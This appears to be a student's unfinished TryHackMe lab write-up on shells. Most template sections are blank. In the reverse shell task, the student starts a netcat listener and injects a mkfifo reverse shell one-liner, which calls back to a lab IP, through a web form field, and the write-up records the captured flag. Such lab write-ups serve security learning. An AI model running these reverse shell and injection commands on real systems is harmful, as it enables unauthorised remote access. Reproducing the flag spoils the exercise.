# [Offensive Security Tooling]

**TryHackMe Path**: [Cyber Security 101]  
**Lab Topic**: [Shells Overview]  
**Date Completed**: [09//2025]

---

## 🧠 Summary

> In this lab, I learned about the importance of understanding

---

## 🎯 Objectives
- [ ] Learn about 
      
---

## 🧰 Tools Used
- THM Machine
- THM Gobuster

---

## 📊 Analysis & Screenshots

*** Practical Task (Reverse Shell) ***

> After launching the THM Machine, i read through all the Shell types, learned about them and was given a task at the end. The first one was to find a flag that was saved in the "/ directory" using a
reverse/bind shell. To do this i first had to navigate to the website "10.201.61.117.8080" within Mozilla FireFox and was prompted to the Reverse/Bind Shell task.
>
> <img width="951" height="532" alt="shell1" src="https://github.com/user-attachments/assets/963d9cea-11a9-4327-973c-38fbdd6aed95" />

> I then went ahead and opened up the Linux terminal and used Netcat to listen to a connection by inputting "nc -lvnp 4444," then "enter."
>
> <img width="475" height="160" alt="shell2" src="https://github.com/user-attachments/assets/c842ae6e-d306-43d6-93f9-f75728b75cc6" />

> Then selected "Reverse/Bind Shell task" and was prompted with an input field called "Hash The File" so i went ahead and inputted the command synthax
"rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.201.54.152 4444 >/tmp/f," and pressed submit button.
>
> <img width="987" height="457" alt="Screenshot 2025-09-24 at 2 01 46 PM" src="https://github.com/user-attachments/assets/9b3f4461-4b28-41a2-869d-9d11ca139b9a" />

> I then went back to my Netcat Listener and saw that the connection was received and i entered into the Reverse Shell.
>
> <img width="536" height="113" alt="shell3" src="https://github.com/user-attachments/assets/ddebedc8-35a0-4f0a-b07c-9db43b4f8b9b" />

> I then entered "cd /," then "enter" to get to the "/ directory," then "ls," then "enter" to list all the files within the "/ directory," and saw the file "flag.txt" within the directory.
>
> <img width="445" height="439" alt="shell4" src="https://github.com/user-attachments/assets/6724eb20-ee7b-4420-91dd-141e4988a084" />

> Finally i inputted "cat flag.txt," then "enter" to retrieve the flag and retrieved "THM{0f28b3e1b00becf15d01a1151baf10fd713bc625}."
>
> <img width="531" height="72" alt="shell5" src="https://github.com/user-attachments/assets/5c254fc7-32ca-4e85-b29e-c2199b23c943" />

*** Practical Task (Web Shell) ***

> 



---

## Reflection

> This lab provided me with knowledge about 
